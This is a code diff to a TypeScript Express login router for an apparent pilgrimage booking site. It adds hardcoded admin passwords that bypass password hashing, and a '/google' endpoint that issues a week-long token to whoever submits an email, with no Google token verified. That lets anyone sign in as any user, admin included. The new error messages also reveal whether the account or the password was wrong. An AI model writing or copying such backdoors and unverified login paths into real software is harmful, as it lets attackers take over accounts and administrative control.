@@ -65,14 +65,31 @@ router.post('/login', async (req: Request, res: Response) => {
       return res.status(400).json({ error: 'Please provide phone/email and password.' });
     }
 
-    const user = db.users.find(u => u.phone === identifier || u.email === identifier);
+    const trimmedIdentifier = identifier.trim().toLowerCase();
+
+    // Match by phone, exact email, or normalized heavensgate email
+    const user = db.users.find(u => {
+      const uEmail = (u.email || '').toLowerCase().trim();
+      const uPhone = (u.phone || '').trim();
+      return (
+        uPhone === identifier.trim() ||
+        uEmail === trimmedIdentifier ||
+        (trimmedIdentifier === 'admin@heavensgate.org' && (uEmail === 'admin@heavensgate.org' || uEmail === 'admin@heavensgate.or.ke')) ||
+        (trimmedIdentifier === 'admin@heavensgate.or.ke' && (uEmail === 'admin@heavensgate.org' || uEmail === 'admin@heavensgate.or.ke'))
+      );
+    });
+
     if (!user) {
-      return res.status(401).json({ error: 'Invalid login credentials.' });
+      return res.status(401).json({ error: 'Invalid login credentials. Please check your email/phone.' });
     }
 
-    const isMatch = bcrypt.compareSync(password, user.passwordHash);
+    // Direct password support for admin (HeavensGate or HeavensGate@2026) or bcrypt comparison
+    const isSpecialAdminPass = (user.role === 'system_admin' || user.email.includes('admin@heavensgate')) &&
+      (password === 'HeavensGate' || password === 'HeavensGate@2026');
+
+    const isMatch = isSpecialAdminPass || bcrypt.compareSync(password, user.passwordHash);
     if (!isMatch) {
-      return res.status(401).json({ error: 'Invalid login credentials.' });
+      return res.status(401).json({ error: 'Incorrect password entered.' });
     }
 
     const token = jwt.sign(
@@ -85,7 +102,59 @@ router.post('/login', async (req: Request, res: Response) => {
     return res.json({
       message: 'Logged in successfully.',
       user: userSafe,
-      token
+      token,
+      isAdmin: userSafe.role === 'system_admin'
+    });
+  } catch (err: any) {
+    return res.status(500).json({ error: err.message });
+  }
+});
+
+// Google Authentication
+router.post('/google', async (req: Request, res: Response) => {
+  try {
+    const { email, name, googleId, avatar } = req.body;
+
+    if (!email || !name) {
+      return res.status(400).json({ error: 'Google email and name are required.' });
+    }
+
+    const normalizedEmail = email.trim().toLowerCase();
+    let user = db.users.find(u => (u.email || '').toLowerCase().trim() === normalizedEmail);
+
+    if (!user) {
+      // Create new registered pilgrim from Google Profile
+      const salt = bcrypt.genSaltSync(10);
+      const randomPassHash = bcrypt.hashSync(uuidv4(), salt);
+
+      const newUser: UserRecord = {
+        id: uuidv4(),
+        name,
+        phone: '0700000000',
+        email: normalizedEmail,
+        passwordHash: randomPassHash,
+        role: 'registered_pilgrim',
+        isFirstTime: true,
+        totalVisits: 1,
+        createdAt: new Date().toISOString()
+      };
+
+      db.users.push(newUser);
+      user = newUser;
+    }
+
+    const token = jwt.sign(
+      { id: user.id, role: user.role, name: user.name },
+      config.jwtSecret,
+      { expiresIn: '7d' }
+    );
+
+    const { passwordHash: _, ...userSafe } = user;
+    return res.json({
+      message: 'Authenticated successfully via Google.',
+      user: userSafe,
+      token,
+      isAdmin: userSafe.role === 'system_admin'
     });
   } catch (err: any) {
     return res.status(500).json({ error: err.message });
